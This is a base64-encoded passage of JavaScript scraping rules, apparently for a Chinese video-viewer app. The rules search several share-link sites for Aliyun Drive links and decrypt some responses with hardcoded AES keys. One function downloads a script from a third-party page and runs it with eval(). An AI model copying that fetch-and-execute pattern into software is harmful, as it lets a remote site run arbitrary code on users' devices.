g7IGkrKykge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGxpc3QgPSBwYXJzZURvbUZvckFycmF5KGJldGhbaV0sICcubW9kdWxlLXBsYXllci1saXN0JiZwJylcXG4gICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgbGlzdC5sZW5ndGg7IGorKykge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB1ID0gcGFyc2VEb21Gb3JIdG1sKGxpc3Rbal0sICdwJiZUZXh0Jyk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCF1LmluY2x1ZGVzKFxcXCIvcy9cXFwiKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGJldFtpXS50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGljX3VybDogYmV0W2ldLmltYWdlLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6IGJldFtpXS5kZXNjICsgJ1xcXFxuJyArIHUsXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxuXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxuICAgICAgICB9XFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIG5hbWU6IFxcXCLpmL/ph4zkupHnm5jnvZFcXFwiLFxcbiAgICAgICAgcGFnZTogdHJ1ZSxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXG4gICAgICAgICAgICBsZXQgdXJsID0gXFxcImh0dHBzOi8vd3d3LmFseXB3LmNuL3NlYXJjaC5waHA/cT1cXFwiICsgcyArIFxcXCImcGFnZT1cXFwiICsgcGFnZTtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QodXJsLCB7fSk7XFxuICAgICAgICAgICAgbGV0IGFyciA9IHBhcnNlRG9tRm9yQXJyYXkoaHRtbCwgJy5saXN0JiZsaScpO1xcbiAgICAgICAgICAgIC8vbG9nKGFycik7XFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICBsZXQgYmV0ID0gW107XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcbiAgICAgICAgICAgICAgICBsZXQgdXRpdGxlID0gcGFyc2VEb21Gb3JIdG1sKGl0LCAnYSYmdGl0bGUnKTtcXG4gICAgICAgICAgICAgICAgbGV0IHVzZXJpYWwgPSBwYXJzZURvbUZvckh0bWwoaXQsICcuZmEtY2xvY2stbyYmVGV4dCcpO1xcbiAgICAgICAgICAgICAgICBsZXQgdWltYWdlID0gcGFyc2VEb20oaXQsICdpbWcmJnNyYycsICdodHRwczovL3d3dy5hbHlwdy5jbi8nKTtcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBwYXJzZURvbShpdCwgJ2EmJmhyZWYnLCAnaHR0cHM6Ly93d3cuYWx5cHcuY24vJyk7XFxuICAgICAgICAgICAgICAgIC8vbGV0IGRldCA9IHJlcXVlc3QodSwge30pO1xcbiAgICAgICAgICAgICAgICBpZiAoIXV0aXRsZS5pbmNsdWRlcyhzKSkge1xcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgYmV0LnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHV0aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdSxcXG4gICAgICAgICAgICAgICAgICAgIGltYWdlOiB1aW1hZ2UsXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiB1c2VyaWFsXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAvL2xvZyhiZXQpO1xcbiAgICAgICAgICAgIGlmIChiZXQubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgICBsZXQgYmV0aCA9IGJhdGNoRmV0Y2goYmV0KTtcXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBiZXRoLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgbGlzdCA9IHBhcnNlRG9tRm9yQXJyYXkoYmV0aFtpXSwgJ2JvZHkmJmFbaHJlZl49aHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvXScpXFxuICAgICAgICAgICAgICAgICAgICAvL2xvZyhsaXN0KTtcXG4gICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgbGlzdC5sZW5ndGg7IGorKykge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB1ID0gcGFyc2VEb21Gb3JIdG1sKGxpc3Rbal0sICdhJiZocmVmJyk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGJldFtpXS50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGljX3VybDogYmV0W2ldLmltYWdlLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6IGJldFtpXS5kZXNjICsgJ1xcXFxuJyArIHUsXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxuXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxuICAgICAgICB9XFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIG5hbWU6IFxcXCLlnJ/mi6jpvKBcXFwiLFxcbiAgICAgICAgcGFnZTogZmFsc2UsXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxuICAgICAgICAgICAgbGV0IGh0bWwgPSBmZXRjaCgnaHR0cHM6Ly93d3cudGJzZHkuY29tL3NlYXJjaC5odG1sP2tleXdvcmQ9JyArIHMgKyAnJmNhdGVnb3J5PTk4MzkyMCZkYXRhX3R5cGU9OTg3OTEwJywge1xcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxuICAgICAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6IFBDX1VBXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG5cXG4gICAgICAgICAgICBsZXQgYXJyID0gcGFyc2VEb21Gb3JBcnJheShodG1sLCAnLnNlYXJjaF9yZXN1bHRfbmV0ZGlza19saXN0JiZhJyk7XFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBhcnJbaV07XFxuICAgICAgICAgICAgICAgIC8vbG9nKGl0KTtcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBwYXJzZURvbUZvckh0bWwoaXQsICdhJiZocmVmJyk7XFxuICAgICAgICAgICAgICAgIGxldCB0aXQgPSBwYXJzZURvbUZvckh0bWwoaXQsICcubmV0ZGlza19pdGVtX2RldGFpbF9uYW1lJiZUZXh0Jyk7XFxuICAgICAgICAgICAgICAgIGlmICghdGl0LmluY2x1ZGVzKHMpKSB7XFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAvL2xvZyh1KTtcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXQsXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBcXFwiXFxcXG5cXFwiICsgdSxcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBkO1xcbiAgICAgICAgfVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBuYW1lOiBcXFwi6Zi/6YeM5pCcXFxcIixcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoJ2h0dHBzOi8vYWxpc28uY2Mvcy8nICsgcyArICctJyArIHBhZ2UgKyAnLTAuaHRtbCcsIHt9KTtcXG5cXG4gICAgICAgICAgICBsZXQgbGlzdCA9IHBhcnNlRG9tRm9yQXJyYXkoaHRtbCwgJy5zZWFyY2gtcmVzdWx0JiYucmVzb3VyY2UtaXRlbScpO1xcbiAgICAgICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgbGlzdC5sZW5ndGg7IGorKykge1xcbiAgICAgICAgICAgICAgICBsZXQgdSA9IGxpc3Rbal07XFxuICAgICAgICAgICAgICAgIGxldCB0aXQgPSBwYXJzZURvbUZvckh0bWwodSwgJ2gzJiZUZXh0Jyk7XFxuICAgICAgICAgICAgICAgIGlmICghdGl0LmluY2x1ZGVzKHMpKSB7XFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHRpdCxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogcGFyc2VEb20odSwgJ2gzJiZhJiZocmVmJywgJ2h0dHBzOi8vYWxpc28uY2MvJyksXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBwYXJzZURvbUZvckh0bWwodSwgJy50aW1lJiZUZXh0JyksXFxuICAgICAgICAgICAgICAgIH0pO1xcblxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gZDtcXG4gICAgICAgIH0sXFxuICAgICAgICBmaW5kQWxpVXJsKGlucHV0KSB7XFxuICAgICAgICAgICAgZXZhbChnZXRDcnlwdG9KUygpKTtcXG5cXG4gICAgICAgICAgICBmdW5jdGlvbiBkZWNyeShzdHIpIHtcXG4gICAgICAgICAgICAgICAgdmFyIGtleSA9IENyeXB0b0pTLmVuYy5VdGY4LnBhcnNlKFxcXCI5RUIyMERERkQ2QUZCRDY4XFxcIik7XFxuICAgICAgICAgICAgICAgIHZhciBlbmNyeXB0ZWQgPSBDcnlwdG9KUy5BRVMuZGVjcnlwdChzdHIsIGtleSwge1xcbiAgICAgICAgICAgICAgICAgICAgaXY6IGtleSxcXG4gICAgICAgICAgICAgICAgICAgIG1vZGU6IENyeXB0b0pTLm1vZGUuQ0JDLFxcbiAgICAgICAgICAgICAgICAgICAgcGFkZGluZzogQ3J5cHRvSlMucGFkLlBrY3M3XFxuICAgICAgICAgICAgICAgIH0pLnRvU3RyaW5nKENyeXB0b0pTLmVuYy5VdGY4KTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY3J5cHRlZDtcXG4gICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KGlucHV0KTtcXG4gICAgICAgICAgICBsZXQgYnV0ID0gcGFyc2VEb20oaHRtbCwgJy5idXR0b24mJmhyZWYnLCAnaHR0cHM6Ly9hbGlzby5jYy8nKTtcXG4gICAgICAgICAgICAvL2xvZyhidXQpO1xcbiAgICAgICAgICAgIGxldCBnb3QgPSByZXF1ZXN0KGJ1dCk7XFxuICAgICAgICAgICAgLy9sb2coZ290KTtcXG4gICAgICAgICAgICBldmFsKHBhcnNlRG9tRm9ySHRtbChnb3QsICdoZWFkJiZzY3JpcHQsMSYmSHRtbCcpKTtcXG4gICAgICAgICAgICByZXR1cm4gZGVjcnkoYmFzZTY0LnNwbGl0KCchJylbMF0pO1xcbiAgICAgICAgfVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBuYW1lOiBcXFwi5LqR55uY5YiG5Lqr56S+XFxcIixcXG4gICAgICAgIHBhZ2U6IGZhbHNlLFxcbiAgICAgICAgZmluZDogZnVuY3Rpb24ocywgcGFnZSkge1xcbiAgICAgICAgICAgIGxldCBhbGlVdGlsID0gJC5yZXF1aXJlKFxcXCJhbGlVdGlsXFxcIik7XFxuICAgICAgICAgICAgbGV0IENyeXB0b0pTID0gYWxpVXRpbC5nZXRDcnlwdG9KUygpO1xcblxcbiAgICAgICAgICAgIGZ1bmN0aW9uIGRlY3J5KHN0cikge1xcbiAgICAgICAgICAgICAgICB2YXIga2V5ID0gQ3J5cHRvSlMuZW5jLlV0ZjgucGFyc2UoXFxcIjVGNkIyQUszM0RBU0QxMjNcXFwiKTtcXG4gICAgICAgICAgICAgICAgdmFyIGVuY3J5cHRlZCA9IENyeXB0b0pTLkFFUy5kZWNyeXB0KHN0ciwga2V5LCB7XFxuICAgICAgICAgICAgICAgICAgICBtb2RlOiBDcnlwdG9KUy5tb2RlLkVDQixcXG4gICAgICAgICAgICAgICAgICAgIHBhZGRpbmc6IENyeXB0b0pTLnBhZC5Qa2NzN1xcbiAgICAgICAgICAgICAgICB9KS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBlbmNyeXB0ZWQ7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdCgnaHR0cHM6Ly93d3cueXVucGFuZmVueGlhbmcuY24vYXBpL2Jicy9hcGkvZ2V0ZGF0YT9rZXk9JyArIHMgKyAnJnR5cGU9dmlkZW8nLCB7XFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJSZWZlcmVyXFxcIjogXFxcImh0dHBzOi8vd3d3Lnl1bnBhbmZlbnhpYW5nLmNuL1xcXCJcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIGxldCBqc29uID0gZGVjcnkoSlNPTi5wYXJzZShodG1sKS5kYXRhKTtcXG4gICAgICAgICAgICAvL2xvZyhqc29uKTtcXG4gICAgICAgICAgICBsZXQgYXJyID0gSlNPTi5wYXJzZShqc29uKTsgLy9bMF0ucmVzdWx0Lml0ZW1zO1xcbiAgICAgICAgICAgIC8vbG9nKGFycik7XFxuXFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICBsZXQgYmV0ID0gW107XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcbiAgICAgICAgICAgICAgICBsZXQgdXJsID0gaXQucGlkO1xcbiAgICAgICAgICAgICAgICBiZXQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB1cmw6ICdodHRwczovL3d3dy55dW5wYW5mZW54aWFuZy5jbi9hcGkvYmJzL2FwaS9nZXRhcnRpY2xlP2lkPScgKyB1cmwsXFxuICAgICAgICAgICAgICAgICAgICBvcHRpb25zOiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXFwiUmVmZXJlclxcXCI6IFxcXCJodHRwczovL3d3dy55dW5wYW5mZW54aWFuZy5jbi9cXFwiXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgLy9sb2codSk7XFxuICAgICAgICAgICAgbGV0IGJldGggPSBiYXRjaEZldGNoKGJldCk7XFxuXFxuICAgICAgICAgICAgLy9sb2coYXJ0aWNsZSk7XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBiZXRoLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICAgICAgICAgIGxldCBqc29uID0gSlNPTi5wYXJzZShiZXRoW2ldKS5kYXRhO1xcbiAgICAgICAgICAgICAgICAvL2xvZyhqc29uKTtcXG4gICAgICAgICAgICAgICAgbGV0IGxpc3QgPSBqc29uLmRvd25sb2FkLnNwbGl0KCdAJyk7XFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgbGlzdC5sZW5ndGg7IGorKykge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IHUgPSBsaXN0W2pdO1xcbiAgICAgICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZToganNvbi50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICAvL3VybDogJ2hpa2VyOi8vcGFnZS9kZXRhaWw/cnVsZT3kupHnm5jmsYflvbEmdXJsPScgKyB1ICsgJz8/ZnlwYWdlJyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAvL3VybDogJ2hpa2VyOi8vcGFnZS9wdXNoP3VybD1oaWtlcjovL2VtcHR5IyMnICsgZW5jb2RlVVJJQ29tcG9uZW50KHUpICsgJz8/P2Z5cGFnZScsXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvJyArIHUsXFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVzYzoganNvbi5jcmVhdGV0aW1lICsgXFxcIlxcXFxuXFxcIiArICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vcy8nICsgdSxcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcblxcbiAgICAgICAgICAgIHJldHVybiBkO1xcbiAgICAgICAgfVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBuYW1lOiBcXFwi55uY5pCcXFxcIixcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxuICAgICAgICAgICAgcGFnZSA9IChwYWdlIC0gMSkgKiAxMDtcXG4gICAgICAgICAgICBsZXQgdXJsID0gXFxcImh0dHBzOi8vd3d3LnBhbnNlYXJjaC5tZS9zZWFyY2g/a2V5d29yZD1cXFwiICsgcyArIFxcXCImb2Zmc2V0PVxcXCIgKyBwYWdlICsgXFxcIiZwYW49YWxpeXVuZHJpdmVcXFwiO1xcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdCh1cmwsIHt9KTtcXG5cXG4gICAgICAgICAgICBsZXQgYXJyID0gcGFyc2VEb21Gb3JBcnJheShodG1sLCAnLmdyaWQmJi5zaGFkb3c6aGFzKGFbaHJlZl49aHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvXSknKTtcXG4gICAgICAgICAgICAvL2xvZyhhcnIpO1xcbiAgICAgICAgICAgIGxldCBkID0gW107XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcbiAgICAgICAgICAgICAgICBsZXQgdSA9IHBhcnNlRG9tRm9ySHRtbChpdCwgJ2FbaHJlZl49aHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvXSYmaHJlZicpO1xcbiAgICAgICAgICAgICAgICBsZXQgcGljX3VybCA9IHBhcnNlRG9tRm9ySHRtbChpdCwgJ2ltZyYmc3JjJyk7XFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogcGFyc2VEb21Gb3JIdG1sKGl0LCAnLmJyZWFrLWFsbCYmVGV4dCcpLnNwbGl0KCdodHRwJylbMF0sXFxuICAgICAgICAgICAgICAgICAgICBwaWNfdXJsOiBwaWNfdXJsID09PSBcXFwiL2Zhdmljb24ucG5nXFxcIiA/IFxcXCJodHRwczovL3d3dy5wYW5zZWFyY2gubWUvXFxcIiArIHBpY191cmwgOiBwaWNfdXJsLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiB1LFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogcGFyc2VEb21Gb3JIdG1sKGl0LCAncCYmVGV4dCcpICsgXFxcIlxcXFxuXFxcIiArIHUsXFxuICAgICAgICAgICAgICAgIH0pO1xcblxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gZDtcXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgbmFtZTogXFxcIkRPVljmkJxcXFwiLFxcbiAgICAgICAgcGFnZTogZmFsc2UsXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxuICAgICAgICAgICAgbGV0IHVybCA9IFxcXCJodHRwczovL2FwaS5kb3Z4LnRrL2FsaS9zZWFyY2g/d2Q9XFxcIiArIHM7XFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KHVybCwge30pO1xcbiAgICAgICAgICAgIC8vbG9nKGJhc2U2NERlY29kZShodG1sKSk7XFxuICAgICAgICAgICAgbGV0IGFyciA9IEpTT04ucGFyc2UoaHRtbCkubGlzdDtcXG4gICAgICAgICAgICAvL2xvZyhhcnIpO1xcbiAgICAgICAgICAgIGxldCBkID0gW107XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcbiAgICAgICAgICAgICAgICBsZXQgdSA9IGl0LnZvZF9jb250ZW50O1xcbiAgICAgICAgICAgICAgICAvL3UgPSB1Lmxlbmd0aCA+IDAgPyB1WzBdIDogdXJsO1xcbiAgICAgICAgICAgICAgICBpZiAoIXUuaW5jbHVkZXMoXFxcImFsaXl1bmRyaXZlXFxcIikpIHtcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGlmICghY2hlY2thbGkodSkpIHtcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuKImiBcXFwiICsgaXQudm9kX25hbWUsXFxuICAgICAgICAgICAgICAgICAgICBwaWNfdXJsOiBpdC52b2RfcGljLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiB1LFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogXFxcIlxcXFxuXFxcIiArIHUsXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gZDtcXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgbmFtZTogXFxcIuW/heW6lFxcXCIsXFxuICAgICAgICBwYWdlOiB0cnVlLFxcbiAgICAgICAgZmluZDogZnVuY3Rpb24ocywgcGFnZSkge1xcbiAgICAgICAgICAgIGxldCB1cmwgPSBcXFwiaHR0cHM6Ly9jbi5iaW5nLmNvbS9zZWFyY2g/cT1cXFwiICsgcyArIFxcXCIrYWxpeXVuZHJpdmUmcXM9ZHMmZm9ybT1RQlJFXFxcIjtcXG4gICAgICAgICAgICBpZiAocGFnZSAhPSAxKSB7XFxuICAgICAgICAgICAgICAgIHVybCA9IGdldE15VmFyKFxcXCJiaW5nXFxcIiwgdXJsKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KHVybCwge1xcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxuICAgICAgICAgICAgICAgICAgICBcXFwiUmVmZXJlclxcXCI6IFxcXCJodHRwczovL2NuLmJpbmcuY29tL1xcXCIsXFxuICAgICAgICAgICAgICAgICAgICAvL1xcXCJYLVJlcXVlc3RlZC1XaXRoXFxcIjogXFxcImNvbS5leGFtcGxlLmhpa2Vydmlld1xcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwiQWNjZXB0XFxcIjogXFxcInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOVxcXCJcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIGxldCBhcnIgPSBwZGZhKGh0bWwsIFxcXCJib2R5JiZhXFxcIik7XFxuICAgICAgICAgICAgLy9sb2coYXJyKTtcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICAgICAgICAgIGxldCBpdCA9IGFycltpXTtcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBwZChpdCwgXFxcImEmJmhyZWZcXFwiLCB1cmwpO1xcbiAgICAgICAgICAgICAgICBsZXQgdCA9IHBkZmgoaXQsIFxcXCJhJiZUZXh0XFxcIik7XFxuICAgICAgICAgICAgICAgIGlmIChpdC5pbmNsdWRlcyhcXFwiTmV4dCBwYWdlXFxcIikgfHwgaXQuaW5jbHVkZXMoXFxcIuS4i+S4gOmhtVxcXCIpKSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgdTIgPSBwZChpdCwgXFxcImEmJmhyZWZcXFwiLCB1cmwpO1xcbiAgICAgICAgICAgICAgICAgICAgLy9sb2coXFxcIm5leHQgcGFnZVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgLy9sb2codTIpO1xcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImJpbmdcXFwiLCB1Mik7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgaWYgKHUgPT0gbnVsbCB8fCB0ID09IG51bGwgfHwgIWl0LmluY2x1ZGVzKHMpKSB7XFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpZiAoIWl0LmluY2x1ZGVzKFxcXCLnvZHnm5hcXFwiKSAmJiAhaXQuaW5jbHVkZXMoXFxcIuS6keebmFxcXCIpICYmXFxuICAgICAgICAgICAgICAgICAgICAhaXQuaW5jbHVkZXMoXFxcImFsaXl1bmRyaXZlXFxcIikgJiYgIWl0LmluY2x1ZGVzKFxcXCJ5dW5wYW5cXFwiKSkge1xcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgaWYgKHUuc3RhcnRzV2l0aChcXFwiaHR0cHM6Ly9jbi5iaW5nLmNvbS9cXFwiKSkge1xcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgbGV0IGRvbSA9IGdldEhvbWUodSkucmVwbGFjZShcXFwiaHR0cDovL1xcXCIsIFxcXCJcXFwiKS5yZXBsYWNlKFxcXCJodHRwczovL1xcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICAgICAgbGV0IF9saW5rcyA9IHQubWF0Y2goL2h0dHBzOlxcXFwvXFxcXC8od3d3XFxcXC5hbGl5dW5kcml2ZVxcXFwuY29tXFxcXC9zfGFseXdwXFxcXC5uZXQpXFxcXC9cXFxcdyovZykgfHwgW107XFxuICAgICAgICAgICAgICAgIGxldCBjID0gbnVsbDtcXG4gICAgICAgICAgICAgICAgaWYgKF9saW5rcy5sZW5ndGggPiAxICYmIF9saW5rc1sxXS5yZXBsYWNlKF9saW5rc1swXSwgXFxcIlxcXCIpLnJlcGxhY2UoL1thLXpBLVowLTldKy9nLCBcXFwiXFxcIikgPT0gXFxcIlxcXCIpIHtcXG4gICAgICAgICAgICAgICAgICAgIGMgPSBfbGlua3NbMV07XFxuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoX2xpbmtzLmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICAgICAgICAgIGMgPSBfbGlua3NbMF07XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0LFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogZG9tLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBjICE9IG51bGwgPyBjIDogdSxcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIui/m+WFp